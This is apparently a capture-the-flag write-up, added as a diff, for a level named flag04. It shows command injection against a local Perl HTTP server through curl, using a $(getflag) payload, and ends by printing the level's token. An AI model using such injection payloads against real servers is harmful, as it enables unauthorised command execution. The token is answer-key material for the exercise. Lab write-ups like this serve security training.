@@ -1,0 +1,18 @@
+There is a perl script that seems to be a http server listening in:
+
+```localhost:4747```
+
+Looking at the code it expects a payload named 'x' and it will print 'echo $x'
+I can execute the server code with:
+
+```curl -d x='command' localhost:4747```
+
+I can also inject commands with '$(command)'. Since the owner of the script is
+flag04, I can read the flag04 password with:
+
+```curl -d x='$(getflag)' localhost:4747```
+
+-----------------------------------------------
+flag04 password:
+token:				ne2searoevaevoem4ov4ar8ap
+-----------------------------------------------
